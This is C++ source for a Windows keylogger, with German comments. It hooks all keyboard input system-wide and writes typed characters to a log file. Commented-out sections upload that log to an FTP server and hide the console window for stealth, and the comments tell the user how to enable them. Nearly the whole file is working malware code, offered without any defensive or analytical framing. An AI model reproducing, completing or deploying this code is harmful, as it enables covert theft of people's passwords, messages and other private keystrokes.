#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include "Header.h"
#include <string.h>
#include <wininet.h>
#pragma comment(lib, "Wininet")

//Upload Log Datei in einen FTP SERVER
//
//int upload()
//{
//	HINTERNET hFtpSession = InternetConnectW(hInternet, L"", 21, L"", L"", 1, 0x08000000, 0);
//	FtpPutFileW(hFtpSession, L"log.txt", L"/log.txt", 21, 0);
//	std::cout << "File Uploaded." << std::endl;
//	InternetCloseHandle(hFtpSession);
//	InternetCloseHandle(hInternet);
//	return 0;
//}
//FTP UPLOAD END


HHOOK hHook{ NULL };

enum Keys
{
	ShiftKey = 16,
	Capital = 20
};

int shift_active() {
	return GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0;
}

int capital_active() {
	return (GetKeyState(VK_CAPITAL) & 1) == 1;
}

int func(std::string input)
{
	std::ofstream log;
	log.open("log.txt", std::ios_base::app);
	log << input;
	log.close();
	return 0;
}

//var um eine gewisse anzahl an zeichen zu storen
std::string mehmet120log = "";

LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM lParam) {
	if (wParam == WM_KEYDOWN) {
		KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
		DWORD wVirtKey = kbdStruct->vkCode;
		DWORD wScanCode = kbdStruct->scanCode;

		BYTE lpKeyState[256];
		GetKeyboardState(lpKeyState);
		lpKeyState[Keys::ShiftKey] = 0;
		lpKeyState[Keys::Capital] = 0;

		if (shift_active()) {
			lpKeyState[Keys::ShiftKey] = 0x80;
		}
		if (capital_active()) {
			lpKeyState[Keys::Capital] = 0x01;
		}

		char result;
		ToAscii(wVirtKey, wScanCode, lpKeyState, (LPWORD)&result, 0);

		mehmet120log.push_back(result);


		// Hier einstellen ab wie vielen Zeichen der Log created wird
		if (mehmet120log.size() == 20 )
		{
			func(mehmet120log);
			mehmet120log = "";
		}
	}
	return CallNextHookEx(hHook, code, wParam, lParam);
}
//Man muss "//" weggeben um das Konsolen window zu hiden
//void hide()
//{
	//HWND stealth; // window handler used to hide the outputted console window
	//AllocConsole();
	//stealth = FindWindowA("ConsoleWindowClass", NULL);
	//ShowWindow(stealth, 0);
//}
//End
int main(int argc, char* argv[])
{

	//Hier auch wie in Zeile82:
	//hide();
	//MSG Msg;

	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);

	if (hHook == NULL) {
		std::cout << "Der Scheiss geht gar nicht! Fix mal die Bugs du kek." << std::endl;
	}


	while (GetMessage(NULL, NULL, 0, 0));
	return 0;
}
